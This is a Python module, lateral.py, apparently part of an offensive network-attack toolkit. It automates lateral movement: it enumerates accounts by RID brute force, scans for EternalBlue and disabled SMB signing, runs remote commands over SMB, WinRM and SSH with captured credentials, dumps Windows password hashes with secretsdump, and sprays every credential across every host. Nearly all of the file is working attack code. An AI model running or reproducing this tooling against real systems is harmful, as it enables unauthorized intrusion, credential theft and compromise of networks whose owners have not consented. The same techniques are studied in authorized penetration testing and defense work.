"""
lateral.py — Lateral movement via CrackMapExec + SSH
"""

import subprocess, shutil, re
from . import tui


# ── recon helpers ─────────────────────────────────────────────────────────────

def rid_brute(ip: str, user: str = "", password: str = "") -> list[str]:
    """
    Enumerate local accounts via RID brute (CME --rid-brute).
    Returns list of usernames found.
    """
    exe = shutil.which("crackmapexec") or shutil.which("cme")
    if not exe:
        return []
    try:
        out = subprocess.check_output(
            [exe, "smb", ip, "-u", user, "-p", password,
             "--local-auth", "--rid-brute"],
            stderr=subprocess.STDOUT, text=True, timeout=30
        )
    except Exception:
        return []
    users = []
    for line in out.splitlines():
        m = re.search(r"\d+: \S+\\(\S+)\s+\(SidTypeUser\)", line)
        if m:
            name = m.group(1)
            if name not in ("DefaultAccount", "WDAGUtilityAccount", "Invitado", "Guest"):
                users.append(name)
    return users


def check_vulns(ip: str) -> dict:
    """
    Run nmap SMB vuln scripts. Returns dict of vuln name → bool.
    """
    if not shutil.which("nmap"):
        return {}
    scripts = "smb-vuln-ms17-010,smb2-security-mode"
    try:
        out = subprocess.check_output(
            ["nmap", "--script", scripts, "-p", "445", "-T4", ip],
            stderr=subprocess.STDOUT, text=True, timeout=60
        )
    except Exception:
        return {}
    return {
        "ms17-010": "VULNERABLE" in out and "ms17-010" in out.lower(),
        "signing_disabled": "Message signing enabled but not required" in out,
    }


def _cme(hosts: list[str], user: str, password: str,
         protocol="smb", command: str = None) -> list[dict]:
    """Run CrackMapExec against hosts. Returns list of { ip, output, pwned }."""
    exe = shutil.which("crackmapexec") or shutil.which("cme")
    if not exe:
        tui.error("CrackMapExec not found — install: sudo apt install crackmapexec")
        return []

    results = []
    for ip in hosts:
        cmd = [exe, protocol, ip, "-u", user, "-p", password]
        if command:
            cmd += ["-x", command]

        try:
            out = subprocess.check_output(cmd, stderr=subprocess.STDOUT,
                                          text=True, timeout=30)
        except subprocess.CalledProcessError as e:
            out = e.output or ""
        except subprocess.TimeoutExpired:
            out = ""

        pwned = "[+]" in out or "Pwn3d!" in out
        results.append({"ip": ip, "output": out.strip(), "pwned": pwned})

        status = f"{tui.GRN}PWNED{tui.R}" if pwned else f"{tui.DIM}no{tui.R}"
        tui.info(f"  {ip:<16}  {status}")

    return results


def smb_exec(hosts: list[str], user: str, password: str,
             command: str = "whoami") -> list[dict]:
    tui.info(f"SMB exec on {len(hosts)} host(s) as {user} ...")
    return _cme(hosts, user, password, protocol="smb", command=command)


def winrm_exec(hosts: list[str], user: str, password: str,
               command: str = "whoami") -> list[dict]:
    tui.info(f"WinRM exec on {len(hosts)} host(s) as {user} ...")
    return _cme(hosts, user, password, protocol="winrm", command=command)


def ssh_exec(ip: str, user: str, password: str,
             command: str = "id && hostname") -> str:
    """Run command over SSH. Returns stdout."""
    try:
        import paramiko
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(ip, username=user, password=password,
                  timeout=10, allow_agent=False, look_for_keys=False)
        _, stdout, stderr = c.exec_command(command)
        out = stdout.read().decode().strip()
        c.close()
        return out
    except ImportError:
        tui.error("paramiko not installed — pip3 install paramiko")
        return ""
    except Exception as e:
        tui.warn(f"SSH exec failed on {ip}: {e}")
        return ""


def dump_secrets(ip: str, user: str, password: str) -> str:
    """secretsdump — extract local hashes from Windows target."""
    exe = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
    if not exe:
        tui.warn("secretsdump not found — install impacket: sudo apt install python3-impacket")
        return ""
    try:
        out = subprocess.check_output(
            [exe, f"{user}:{password}@{ip}"],
            stderr=subprocess.STDOUT, text=True, timeout=60
        )
        return out
    except Exception as e:
        tui.warn(f"secretsdump failed: {e}")
        return ""


def run_kill_chain(hosts: list[dict], creds: list[dict]) -> list[dict]:
    """
    Given discovered hosts and valid creds, attempt lateral movement
    on every host with every working credential.
    Returns list of successful pivot results.
    """
    if not creds:
        tui.warn("No credentials — cannot attempt lateral movement.")
        return []

    results      = []
    smb_hosts    = [h["ip"] for h in hosts if 445 in (h.get("ports") or [])]
    ssh_hosts    = [h["ip"] for h in hosts if 22  in (h.get("ports") or [])]
    first_cred   = creds[0]
    first_user   = first_cred.get("user", "")
    first_pwd    = first_cred.get("secret", "") or first_cred.get("password", "")

    # ── vuln scan + user enum on Windows targets ──────────────────────────────
    for ip in smb_hosts:
        tui.phase(f"RECON — {ip}")

        vulns = check_vulns(ip)
        if vulns.get("ms17-010"):
            tui.warn(f"  {ip} is VULNERABLE to EternalBlue (MS17-010)!")
            tui.info("  → Use Metasploit: exploit/windows/smb/ms17_010_eternalblue")
        if vulns.get("signing_disabled"):
            tui.info(f"  {ip} has SMB signing disabled — relay attacks possible")

        tui.info(f"  Enumerating local accounts on {ip} ...")
        extra_users = rid_brute(ip, first_user, first_pwd)
        if extra_users:
            tui.info(f"  Found accounts: {', '.join(extra_users)}")
            # Add extra users to spray list with same passwords
            for u in extra_users:
                if u not in [c.get("user") for c in creds]:
                    for c in list(creds):
                        creds.append({"user": u,
                                      "secret": c.get("secret", ""),
                                      "service": c.get("service", "smb"),
                                      "target": ip})

    # ── credential-based lateral movement ─────────────────────────────────────
    for c in creds:
        user = c.get("user", "")
        pwd  = c.get("secret", "") or c.get("password", "")

        if smb_hosts:
            tui.phase(f"SMB LATERAL — {user}")
            r = smb_exec(smb_hosts, user, pwd)
            results += [x for x in r if x["pwned"]]

        for ip in ssh_hosts:
            tui.phase(f"SSH LATERAL — {user}@{ip}")
            out = ssh_exec(ip, user, pwd)
            if out:
                tui.success(f"Shell on {ip}:\n{tui.DIM}{out}{tui.R}")
                results.append({"ip": ip, "service": "ssh", "user": user,
                                "output": out, "pwned": True})

    return results
